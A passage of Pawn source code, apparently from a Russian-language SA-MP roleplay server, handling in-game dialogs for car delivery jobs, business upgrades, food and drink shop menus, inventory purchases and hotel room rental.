			CarJob[GetPVarInt(playerid,"IDCAR")][jcar] = CreateVehicle(CarJob[GetPVarInt(playerid,"IDCAR")][jidcar],CarJob[GetPVarInt(playerid,"IDCAR")][jX],CarJob[GetPVarInt(playerid,"IDCAR")][jY],CarJob[GetPVarInt(playerid,"IDCAR")][jZ],CarJob[GetPVarInt(playerid,"IDCAR")][jFa],CarJob[GetPVarInt(playerid,"IDCAR")][jcolor1],CarJob[GetPVarInt(playerid,"IDCAR")][jcolor2],-1);
	        veh__pos[CarJob[GetPVarInt(playerid,"IDCAR")][jcar]][0] = CarJob[GetPVarInt(playerid,"IDCAR")][jX];
			veh__pos[CarJob[GetPVarInt(playerid,"IDCAR")][jcar]][1] = CarJob[GetPVarInt(playerid,"IDCAR")][jY];
			veh__pos[CarJob[GetPVarInt(playerid,"IDCAR")][jcar]][2] = CarJob[GetPVarInt(playerid,"IDCAR")][jZ];
			veh__pos[CarJob[GetPVarInt(playerid,"IDCAR")][jcar]][3] = CarJob[GetPVarInt(playerid,"IDCAR")][jFa];
			Fuel[CarJob[GetPVarInt(playerid,"IDCAR")][jcar]] = 100;
			BizInfo[GetPVarInt(playerid,"CarDost")][bZakazMest] = 0;
			BizInfo[GetPVarInt(playerid,"CarDost")][bZakaz] = 0;
			query = "";
			format(query, sizeof(query), "UPDATE carjob SET idcar = %d,carpr = %d WHERE id = '%d' LIMIT 1",CarJob[GetPVarInt(playerid,"IDCAR")][jidcar],CarJob[GetPVarInt(playerid,"IDCAR")][jcarpr],GetPVarInt(playerid,"IDCAR"));
			mysql_tquery(mysql,query);
			DeletePVar(playerid,"CarModel");
			DeletePVar(playerid,"CarPrice");
			DeletePVar(playerid,"IDCAR");
		    return true;
		}
		case 178:
		{
		    if(!response) return true;
		    new kek = 0;
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
			    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
				if(GetPVarInt(playerid,"CarDost") == ListNick[playerid][listitem]) kek++;
			}
			if(kek == 1) return SendClientMessage(playerid,CGREY,"Данный заказ уже приняли");
			SendClientMessage(playerid,-1,"Вы приняли заказ, забирите груз на заводе. Если хотите отменить заказ {f7ae11}/cancel");
			SetPVarInt(playerid,"CarDost",ListNick[playerid][listitem]);
			SetPVarInt(playerid,"CarLvl",1);
			SetPlayerRaceCheckpoint(playerid,2,-23.6212,-273.6993,5.4297,0,0,0,10);
		}
		
		case 180:
		{
		    if(!response) return ShowBizUl(playerid);
            if(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bUl][ListNick[playerid][0]]) return 1;
		    switch(ListNick[playerid][0])
		    {
	   		 	case 0: if(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney] < BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*10) return SendClientMessage(playerid,CGREY,"Недостаточно средств на счету бизнеса");
			    case 1: if(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney] < BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*10) return SendClientMessage(playerid,CGREY,"Недостаточно средств на счету бизнеса");
			    case 2: if(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney] < BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*10) return SendClientMessage(playerid,CGREY,"Недостаточно средств на счету бизнеса");
			    case 3: if(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney] < BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*8) return SendClientMessage(playerid,CGREY,"Недостаточно средств на счету бизнеса");
                case 4: if(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney] < BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*5) return SendClientMessage(playerid,CGREY,"Недостаточно средств на счету бизнеса");
			}
   			switch(ListNick[playerid][0])
		    {
	   		 	case 0: BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney] -= BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*10;
			    case 1: BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney] -= BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*10;
			    case 2: BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney] -= BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*10;
			    case 3: BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney] -= BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*8;
			    case 4: BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney] -= BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*5;
			}
			BizInfo[GetPVarInt(playerid,"PlayerBiz")][bUl][ListNick[playerid][0]] = 1;
			SetBizInt(GetPVarInt(playerid,"PlayerBiz"),"money",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMoney]);
			switch(ListNick[playerid][0])
		    {
	   		 	case 0: SetBizInt(GetPVarInt(playerid,"PlayerBiz"),"ul1",1);
			    case 1: SetBizInt(GetPVarInt(playerid,"PlayerBiz"),"ul2",1);
			    case 2: SetBizInt(GetPVarInt(playerid,"PlayerBiz"),"ul3",1);
		     	case 3: SetBizInt(GetPVarInt(playerid,"PlayerBiz"),"ul4",1);
		     	case 4: SetBizInt(GetPVarInt(playerid,"PlayerBiz"),"ul5",1);
			}
			SendClientMessage(playerid,CREWARD,"[BIZ]{FFFFFF} Вы приобрели улучшение");
		}
  		case 181:
	    {
	        if(!response) return true;
	        new cena = ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][listitem];
	        new prods = ProdInfo[GetPVarInt(playerid,"PBIZ")][prodMinus][listitem];
	        SetPVarInt(playerid,"AmmoProd",prods);
	        SetPVarInt(playerid,"AmmoPrice",cena);
	        SetPVarInt(playerid,"AmmoList",(!BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4]) ? (listitem-1) : (listitem));
	        if(!BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4]) listitem++;
			switch(listitem)
			{
			    case 0:
			    {
					if(!GetPVarInt(playerid,"Oplata"))
					{
					    ShowPlayerDialog(playerid,467,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Введите PIN-CODE от карты:\n\n","Далее","Отмена");
					}
					else
					{
						DeletePVar(playerid,"Oplata");
						ShowMenuBiz(playerid);
					}
			    }
				case 1:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Кусок пиццы?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Кусока пиццы",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
	
				}
				case 2:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Кусок пиццы с картошкой?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Кусока пиццы с картошкой",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
	
					SetPVarInt(playerid,"AmmoObject",2218);

					SetPVarInt(playerid,"Golod",50);
				}
				case 3:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Средняя пицца с напитком?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Средней пицца с напитком",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
			
					SetPVarInt(playerid,"AmmoObject",2219);
				
					SetPVarInt(playerid,"Golod",80);
				}
				case 4:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Большая пицца?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Большой пицца",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
				
					SetPVarInt(playerid,"AmmoObject",2220);
			
					SetPVarInt(playerid,"Golod",100);
				}
				case 5:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Газировка 'Sprunk'?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Газировка 'Sprunk'",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",1);
		
				}
			}
	    }
	    case 182:
	    {
	        if(!response) return true;
	        new cena = ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][listitem];
	        new prods = ProdInfo[GetPVarInt(playerid,"PBIZ")][prodMinus][listitem];
	        SetPVarInt(playerid,"AmmoProd",prods);
	        SetPVarInt(playerid,"AmmoPrice",cena);
	        if(!BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4]) listitem++;
			switch(listitem)
			{
			    case 0:
			    {
					if(!GetPVarInt(playerid,"Oplata"))
					{
					    ShowPlayerDialog(playerid,467,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Введите PIN-CODE от карты:\n\n","Далее","Отмена");
					}
					else
					{
						DeletePVar(playerid,"Oplata");
						ShowMenuBiz(playerid);
					}
			    }
				case 1:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Бургер?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка бургера",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
		
				}
				case 2:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Эконом меню?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Эконом меню",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
				
					SetPVarInt(playerid,"AmmoObject",2217);
		
					SetPVarInt(playerid,"Golod",50);
				}
				case 3:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Стандартное меню?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Стандартного меню",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
				
					SetPVarInt(playerid,"AmmoObject",2216);
				
					SetPVarInt(playerid,"Golod",80);
				}
				case 4:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Королевское меню?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Королевского меню",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
				
					SetPVarInt(playerid,"AmmoObject",2213);
	
					SetPVarInt(playerid,"Golod",100);
				}
				case 5:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Газировка 'Sprunk'?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Газировка 'Sprunk'",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",1);

				}
			}
	    }
	    case 183:
	    {
	        if(!response) return true;
	        new str[144];
	        switch(listitem)
	        {
	            case 0:
	            {

	                query = "";
				    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4])
					{
					    format(str,sizeof(str),"Оплата\t%s\n",(!GetPVarInt(playerid,"Oplata")) ? ("{20BA09}[Наличные]") : ("{A8EFFF}[Карта]"));
						strcat(query,str);
					}
					for(new i = 0; i <= 5; i++)
				    {
						format(str,sizeof(str),"%s\t{f7ae11}[%d$]{ffffff}\n",ProdNames[GetPVarInt(playerid,"PBIZ")][i],ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][i]);
						strcat(query,str);
			    	}
  					ShowPlayerDialog(playerid,186,DIALOG_STYLE_TABLIST,"Меню",query,"Далее","Назад");
	            }
	            case 1:
	            {
	                query = "";
				    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4])
					{
					    format(str,sizeof(str),"Оплата\t%s\n",(!GetPVarInt(playerid,"Oplata")) ? ("{20BA09}[Наличные]") : ("{A8EFFF}[Карта]"));
						strcat(query,str);
					}
					for(new i = 6; i < MAX_PROD[GetPVarInt(playerid,"PBIZ")]; i++)
				    {
						format(str,sizeof(str),"%s\t{f7ae11}[%d$]{ffffff}\n",ProdNames[GetPVarInt(playerid,"PBIZ")][i],ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][i]);
						strcat(query,str);
			    	}
	  				ShowPlayerDialog(playerid,184,DIALOG_STYLE_TABLIST,"Меню",query,"Далее","Назад");
	            }
	        }
	    }
	    case 184:
	    {
	        if(!response) return true;
	        
            if(!BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4]) listitem++;
            SetPVarInt(playerid,"AmmoList",(!BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4]) ? (listitem-1) : (listitem));
            
            new cena = ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][listitem+5];
	        new prods = ProdInfo[GetPVarInt(playerid,"PBIZ")][prodMinus][listitem+5];
	        SetPVarInt(playerid,"AmmoProd",prods);

	        SetPVarInt(playerid,"AmmoPrice",cena);
			switch(listitem)
			{
			    case 0:
			    {
			       	if(!GetPVarInt(playerid,"Oplata"))
					{
					    ShowPlayerDialog(playerid,467,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Введите PIN-CODE от карты:\n\n","Далее","Отмена");
					}
					else
					{
						DeletePVar(playerid,"Oplata");
						ShowMenuBiz(playerid);
					}
			    }
				case 1:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Пиццу 'Моцарелла'?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Пиццы 'Моцарелла'",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
				
					SetPVarInt(playerid,"AmmoObject",2219);
				
					SetPVarInt(playerid,"Golod",50);
				}
				case 2:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Пиццу 'Маргарита'?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Пиццы 'Маргарита'",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
					
					SetPVarInt(playerid,"AmmoObject",2219);
				
					SetPVarInt(playerid,"Golod",50);
				}
				case 3:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Салат 'Цезарь'?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Салата 'Цезарь'",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
				
					SetPVarInt(playerid,"AmmoObject",2353);
				
					SetPVarInt(playerid,"Golod",30);
				}
				case 4:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Равиоли Карбонара?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Равиоли Карбонара",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
				
					SetPVarInt(playerid,"AmmoObject",2354);
				
					SetPVarInt(playerid,"Golod",70);

				}
				case 5:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Лазанью 'Болоньезе'?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Лазаньи 'Болоньезе'",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
				
					SetPVarInt(playerid,"AmmoObject",2355);
			
					SetPVarInt(playerid,"Golod",70);
				}
				case 6:
				{
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Пасту 'Четыре моря'?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,51,DIALOG_STYLE_MSGBOX,"Покупка Пасты 'Четыре моря'",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
			
					SetPVarInt(playerid,"AmmoObject",2353);
				
					SetPVarInt(playerid,"Golod",100);
				}
			}
	    }
   		case 185:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        DeletePVar(playerid,"AmmoObject");
		        DeletePVar(playerid,"AmmoProd");
		        return true;
		    }
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bProd] < GetPVarInt(playerid,"AmmoProd"))
		    {
		        SendClientMessage(playerid,CGREY,"В магазине кончились продукты");
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        DeletePVar(playerid,"AmmoObject");
		        DeletePVar(playerid,"AmmoProd");
		        return true;
		    }
		    if(!GetPVarInt(playerid,"Oplata"))
      		{
				if(PlayerInfo[playerid][pCash] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        DeletePVar(playerid,"AmmoObject");
			        DeletePVar(playerid,"AmmoProd");
			        return true;
				}
			}
			else
			{
				if(PlayerInfo[playerid][pBank] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        DeletePVar(playerid,"AmmoObject");
			        DeletePVar(playerid,"AmmoProd");
			        return true;
				}
			}
			switch(GetPVarInt(playerid,"AmmoList"))
			{
				/*
				
				*/
				case 0:
				{
					if(GetFree(playerid,313,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре!");
					GiveInv(playerid,313,1);
				}
				/*SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK),SetPVarInt(playerid,"UseSp",7);*/
				case 1:
				{
				    if(GetFree(playerid,314,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре!");
					GiveInv(playerid,314,1);
					//SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_BEER),SetPVarInt(playerid,"UseSp",13);
				}
				case 2:
				{
				    if(GetFree(playerid,450,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре!");
					GiveInv(playerid,450,1);
				}
				case 3:
				{
				    if(GetFree(playerid,451,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре!");
					GiveInv(playerid,451,1);
				}
				case 4:
				{
				    if(GetFree(playerid,452,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре!");
					GiveInv(playerid,452,1);
				}
			//	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE),SetPVarInt(playerid,"UseSp",13),SetPVarInt(playerid,"Buhlo",1);
			//	case 3: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE),SetPVarInt(playerid,"UseSp",13),SetPVarInt(playerid,"Buhlo",2);
			//	case 4: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE),SetPVarInt(playerid,"UseSp",13),SetPVarInt(playerid,"Buhlo",3);
			}
			SendClientMessage(playerid,CREWARD,"Новый предмет добавлен в инвентарь!");
			if(!GetPVarInt(playerid,"Oplata")) GiveMoney(playerid,-GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")));
			else PlayerInfo[playerid][pBank] -= GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice"));
			BizMinus(GetPVarInt(playerid,"PBIZ"),GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")),GetPVarInt(playerid,"AmmoProd"));
			ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(BotLable[GetPVarInt(playerid,"PBIZ")],-1,"Спасибо за покупку");
			SetTimerEx("ClearBotGlobal", 3000, false, "dd", BIZBOT[GetPVarInt(playerid,"PBIZ")],_:BotLable[GetPVarInt(playerid,"PBIZ")]);
			
		/*	static const fmt_string1[] = "Нажимайте ЛКМ, для того чтобы пить. Питьё расчитано на %i раз";
			new str1[sizeof(fmt_string1)];
			format(str1, sizeof(str1), fmt_string1,GetPVarInt(playerid,"UseSp"));
			SendClientMessage(playerid,CGREEN,str1);*/
   			DeletePVar(playerid,"AmmoGun");
      		DeletePVar(playerid,"AmmoPrice");
      		DeletePVar(playerid,"AmmoProd");
      		DeletePVar(playerid,"AmmoObject");
      		DeletePVar(playerid,"AmmoList");
		}
		case 186:
		{

			if(!response) return true;
			new cena = ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][listitem];
	        new prods = ProdInfo[GetPVarInt(playerid,"PBIZ")][prodMinus][listitem];
	        SetPVarInt(playerid,"AmmoProd",prods);
	        SetPVarInt(playerid,"AmmoPrice",cena);
	       	SetPVarInt(playerid,"AmmoList",(!BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4]) ? (listitem-1) : (listitem));
	        if(!BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4]) listitem++;
			switch(listitem)
			{
				case 0:
				{
				    if(!GetPVarInt(playerid,"Oplata"))
					{
					    ShowPlayerDialog(playerid,467,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Введите PIN-CODE от карты:\n\n","Далее","Отмена");
					}
					else
					{
						DeletePVar(playerid,"Oplata");
						ShowMenuBiz(playerid);
					}
				}
				case 1:
				{

					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Газировку 'Sprunk'?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,185,DIALOG_STYLE_MSGBOX,"Покупка Газировки 'Sprunk'",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);

				}
				case 2:
				{

					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Пиво?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,185,DIALOG_STYLE_MSGBOX,"Покупка Пива",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);

				}
				case 3:
				{

					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Вино?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,185,DIALOG_STYLE_MSGBOX,"Покупка Вина",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
		
				}
				case 4:
				{

					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Виски?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,185,DIALOG_STYLE_MSGBOX,"Покупка Виски",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
			
				}
				case 5:
				{

					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Абсент?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,185,DIALOG_STYLE_MSGBOX,"Покупка Абсента",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",0);
				
				}
			}
		}
		case 187:
		{
		    if(!response) return true;
		    if(listitem == 0)
		    {
		        SetPlayerInterior(playerid,4);
		        SetPVarInt(playerid,"Freeze",1);
		        SetPlayerPos(playerid,2481.4058,2257.6162,991.3969);
		        SetPlayerVirtualWorld(playerid,GetPVarInt(playerid,"PBIZ"));
		    }
		    else if(listitem == 1)
		    {
		        SetPlayerInterior(playerid,BizInfo[GetPVarInt(playerid,"PBIZ")][bInt]);
		        SetPVarInt(playerid,"Freeze",1);
		        SetPlayerPos(playerid,1302.4583,-1346.9148,2001.4359);
		        SetPlayerVirtualWorld(playerid,GetPVarInt(playerid,"PBIZ"));
		    }
		    else
		    {
		        SetPlayerInterior(playerid,BizInfo[GetPVarInt(playerid,"PBIZ")][bInt]);
		        SetPVarInt(playerid,"Freeze",1);
		        SetPlayerPos(playerid,1092.5011,-888.0569,2001.0969);
		        SetPlayerVirtualWorld(playerid,hotelvirt[48-GetPVarInt(playerid,"PBIZ")][listitem-2]);
		    }
		
		}
		case 188:
		{
		    if(!response) return true;
			switch(listitem)
			{
			    case 0:
			    {
    				switch(BizInfo[GetPVarInt(playerid,"PBIZ")][bType])
					{
						case 12: 
						{
						    if(GetPlayerKom(playerid) || GetPlayerHouse(playerid)) return SendClientMessage(playerid,CGREY,"Вы уже имеете жильё");
						    for(new i = 1; i <= TOTALKOM; i++)
							{
							    if(KomInfo[i][kbiz] != GetPVarInt(playerid,"PBIZ") || strcmp(KomInfo[i][kOwner], "None", true)) continue;
							    SetPVarInt(playerid,"Kom",i);
							    static const fmt_string1[] = "{FFFFFF}Команта\t№%i\nЦена:\t\t$%i\n\nВы действительно хотите арендовать данную команату?";
								new str1[sizeof(fmt_string1)+3+5];
								format(str1, sizeof(str1), fmt_string1,KomInfo[i][kNum],ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][0]);
								ShowPlayerDialog(playerid,191,DIALOG_STYLE_MSGBOX,"Покупка",str1,"Да","Нет");
								break;
							}
							if(!GetPVarInt(playerid,"Kom")) SendClientMessage(playerid,CGREY,"Все команты в отеле заняты!");
						}
						case 13: ShowPlayerDialog(playerid,189,DIALOG_STYLE_LIST,"Выберите этаж","1 этаж\n2 этаж","Далее","Назад");
					}
			    }
			    case 1:
				{
				    if(GetPlayerKom(playerid) == 0) return SendClientMessage(playerid,CGREY,"У Вас нет команты в отеле");
				    new str[100];
				    format(str,sizeof(str),"{FFFFFF}Введите на сколько хотите оплатить Вашу комнату оплата за один день %i$.\nОт 1 до 20:",ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][0]);
					ShowPlayerDialog(playerid,192,DIALOG_STYLE_INPUT,"Оплата команты",str,"Далее","Назад");
				}
				case 2:
				{
				    if(GetPlayerKom(playerid) == 0) return SendClientMessage(playerid,CGREY,"У Вас нет команты в отеле");
					ShowPlayerDialog(playerid,193,DIALOG_STYLE_MSGBOX,"Отказ от аренды команты","{FFFFFF}Вы действительно хотите отказаться от аренды команаты в отеле?","Да","Нет");
				}
			}
		}
		case 189:
		{
		    if(!response) return true;
			new kek = 0;
			query = "";
			for(new i = 1; i <= TOTALKOM; i++)
			{
			    if(KomInfo[i][kvirt] == hotelvirt[48-GetPVarInt(playerid,"PBIZ")][listitem])
			    {
					new str[50];
					if(strcmp(KomInfo[i][kOwner], "None", true) == 0) format(str,sizeof(str),"Комната №%i | Свободно\n",KomInfo[i][kNum]);
					else format(str,sizeof(str),"Комната №%i | Занято(%s)\n",KomInfo[i][kNum],KomInfo[i][kOwner]);
					strcat(query,str);
					ListNick[playerid][kek] = i;
					kek++;
			    }
			}
			ShowPlayerDialog(playerid,190,DIALOG_STYLE_LIST,"Выберите команту",query,"Далее","Назад");
		}
		case 190:
		{
		    if(!response) return true;
		    new i = ListNick[playerid][listitem];
		    if(strcmp(KomInfo[i][kOwner], "None", true) == 0)
			{
			    if(GetPlayerKom(playerid) || GetPlayerHouse(playerid)) return SendClientMessage(playerid,CGREY,"Вы уже имеете жильё");
			    SetPVarInt(playerid,"Kom",i);
			    static const fmt_string1[] = "{FFFFFF}Команта\t№%i\nЦена:\t\t$%i\n\nВы действительно хотите арендовать данную команату?";
				new str1[sizeof(fmt_string1)+3+5];
				format(str1, sizeof(str1), fmt_string1,KomInfo[i][kNum],GetCena(GetPVarInt(playerid,"PBIZ"),900));
				ShowPlayerDialog(playerid,191,DIALOG_STYLE_MSGBOX,"Покупка",str1,"Да","Нет");
			}
			else SendClientMessage(playerid,CGREY,"Данная комната занята");
		}
		case 191:
		{
		    if(!response) return DeletePVar(playerid,"Kom");
		    if(GetPlayerKom(playerid) || GetPlayerHouse(playerid)) return SendClientMessage(playerid,CGREY,"Вы уже имеете жильё");
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4]) ShowPlayerDialog(playerid,204,DIALOG_STYLE_LIST,"Способ оплаты","1 | Наличные\n2 | Карта","Далее","Отмена");
		    else BuyKom(playerid);
		    
		    
		}
		case 192:
		{
		    if(!response) return true;
		    if(GetPlayerKom(playerid) == 0) return SendClientMessage(playerid,CGREY,"У Вас нет команты в отеле");
